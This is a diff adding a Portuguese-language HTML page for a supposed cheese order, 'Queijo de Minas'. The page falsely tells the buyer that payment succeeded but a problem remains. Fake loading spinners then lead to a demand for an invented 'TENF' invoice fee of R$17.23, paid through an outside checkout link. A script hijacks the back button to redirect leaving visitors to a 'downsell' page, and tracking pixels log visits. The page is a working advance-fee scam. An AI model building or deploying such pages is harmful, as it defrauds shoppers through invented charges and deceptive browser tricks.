@@ -1,0 +1,212 @@
+<!DOCTYPE html><html lang="pt"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>Queijo de Minas</title>
+    <link rel="stylesheet" href="css/products.css">
+    <link rel="stylesheet" href="css/styles.css">
+    <link rel="stylesheet" href="css/fonts.css">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,0,0">
+<script>
+  window.pixelId = "699020a97b7a5ed21e540e77";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+    
+</head>
+<body>
+   
+
+    <header style="text-align: center; padding: 15px 0; background-color: black; display: flex; justify-content: center; align-items: center;">
+        <img fetchpriority="high" decoding="async" width="200" src="images/express.png" alt="Logo" style="height: auto;">
+    </header>
+
+
+    <div id="ad1">
+
+        <p style="margin-left: 5%; font-family: 'GellixMedium'; font-size: 22px;">Seus pedidos</p>
+
+        <div class="ad1">
+
+            <div style="margin-left: 3%; margin-right: 3%;">
+
+                <button class="styled-button">
+                    <div class="icon-container">
+                        <span class="material-symbols-outlined">local_shipping</span>
+                    </div>
+                    <span class="button-text">
+                        <span class="button-title">#6481749338</span>
+                    </span>
+                </button>
+    
+                <div class="entrega-container">
+                    <div class="entrega-header">
+                        Status
+                    </div>
+                    <div class="entrega-content">
+                        <div class="icon-container2">
+                            <span class="material-symbols-outlined">check</span>
+                        </div>
+                        <div class="text-container">
+                            <div class="entrega-title">Pagamento concluído</div>
+                        </div>
+                    </div>
+                    <div class="entrega-content">
+                        <div class="icon-container3">
+                            <span class="material-symbols-outlined">warning</span>
+                        </div>
+                        <div class="text-container">
+                            <div class="entrega-title">Pendência no pedido</div>
+                        </div>
+                    </div>
+                </div>
+    
+         
+    
+                <p style="text-align: center; margin-left: 3%; margin-right: 3%;">Seu pagamento foi concluido com sucesso, porém foi encontrado uma pendência no seu pedido. Clique abaixo para resolver esse problema!</p>
+    
+                <div class="button-container" style="padding-bottom: 20px;">
+                    <button class="styled-button2" onclick="showAd2()">
+                        <span class="button-text">
+                            <span class="button-title2">Resolver problema</span>
+                        </span>
+                        <span class="material-symbols-outlined" style="font-size: 32px;">arrow_forward_ios</span>
+                    </button>
+                </div>
+            </div>
+            
+        </div>
+
+        
+        
+    </div>
+
+
+    <div id="ad2" style="display: none;">
+
+        <p style="margin-left: 5%; font-family: 'GellixMedium'; font-size: 22px;">Problemas no pedido</p>
+
+        <div class="ad2" style="padding-top: 15px; padding-bottom: 15px;">
+
+            <div style="padding-top: 2px;"></div>
+
+            <div id="loadingGif" class="loading">
+                <div class="spinner"></div>
+            </div>
+    
+
+            <div class="entrega-container hidden" id="text1">
+                <div class="entrega-content">
+                    <div class="icon-container2">
+                        <span class="material-symbols-outlined">settings</span>
+                    </div>
+                    <div class="text-container">
+                        <div class="entrega-title">Estamos identificando o problema no seu pedido!</div>
+                    </div>
+                </div>
+            </div>
+    
+            <div id="loadingGif2" class="loading hidden">
+                <div class="spinner"></div>
+            </div>
+    
+            <div id="text2" class="hidden entrega-container" style="margin-top: 15px;">
+                <div class="entrega-content">
+                    <div class="icon-container2" style="background-color: red;">
+                        <span class="material-symbols-outlined">warning</span>
+                    </div>
+                    <div class="text-container">
+                        <div class="entrega-title">Identificamos que existe uma pendência no seu pedido!</div>
+                    </div>
+                </div>
+            </div>
+
+            <div id="loadingGif3" class="loading hidden" style="padding-top: 20px;">
+                <div class="spinner"></div>
+            </div>
+    
+            <div id="text3" class="hidden entrega-container" style="background-color: #d40303; margin-top: 15px;">
+                <div class="entrega-content">
+                    <div class="icon-container2" style="background-color: rgb(255, 255, 255);">
+                        <span class="material-symbols-outlined" style="color: #d40303;">priority_high</span>
+                    </div>
+                    <div class="text-container">
+                        <div class="entrega-title" style="color: white">É necessário realizar o pagamento da TENF (Taxa de Emissão da Nota Fiscal) para Emitir a Nota Fiscal do seu produto e realizarmos o despacho. No valor único de R$17,23</div>
+                    </div>
+                </div>
+            </div>
+
+<script>
+    
+    function openNewWindowWithUTMs(url) {
+    // Extrai os parâmetros UTM da URL atual
+    const currentUrlParams = new URLSearchParams(window.location.search);
+    let utms = '';
+
+    // Constrói a string dos parâmetros UTM
+    for (let [key, value] of currentUrlParams.entries()) {
+        if (key.startsWith('')) {
+            utms += `${key}=${value}&`;
+        }
+    }
+
+    // Remove o último '&'
+    if (utms) {
+        utms = utms.slice(0, -1); // remove the last '&'
+    }
+
+    // Adiciona os parâmetros UTM à URL especificada
+    const fullUrl = url + (utms? '?' + utms : '');
+
+    // Abre a nova janela ou guia com os parâmetros UTM
+    window.open(fullUrl, '_blank');
+}
+    
+</script>
+
+            <div id="finalButton" class="button-container hidden" style="padding-top: 15px;">
+                
+                <button class="styled-button2" onclick="openNewWindowWithUTMs('https://checkout.newpagamento-seguro.shop/VCCL1O8SCNS2')">
+                    
+                    <span class="button-text">
+                        <span class="button-title2">Pagar a TENF</span>
+                    </span>
+                    <span class="material-symbols-outlined" style="font-size: 32px;">arrow_forward_ios</span>
+                </button>
+            </div>
+
+            <div style="padding-bottom: 2px;"></div>
+
+        </div>
+
+        
+
+    </div>
+    
+    
+    <script src="js/scripts.js"></script>
+
+<script>
+            // BACK REDIRECT
+            var urlBackRedirect = '../downsell-tenf/'; // lembre-se de usar a url sem espaços
+            // não altere nada abaixo dessa linha
+            urlBackRedirect = urlBackRedirect = urlBackRedirect.trim() +
+            (urlBackRedirect.indexOf("?") > 0 ? '&' : '?') +
+            document.location.search.replace('?', '').toString();
+            history.pushState({}, "", location.href);
+            history.pushState({}, "", location.href);
+            window.onpopstate = function () {
+                setTimeout(function () {
+                    location.href = urlBackRedirect + window.location.search;
+                }, 1);
+            };
+            // BACK REDIRECT
+            
+ </script>
+<img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=8505610196162802&ev=PageView"/>
+          
+ </script>
+
+<script>'undefined'=== typeof _trfq || (window._trfq = []);'undefined'=== typeof _trfd && (window._trfd=[]),_trfd.push({'tccl.baseHost':'secureserver.net'},{'ap':'cpsh-oh'},{'server':'p3plzcpnl492182'},{'dcenter':'p3'},{'cp_id':'9883949'},{'cp_cl':'8'}) // Monitoring performance to make your website faster. If you want to opt-out, please contact web hosting support.</script><script src="js/scc-c2.min.js"></script></body></html>
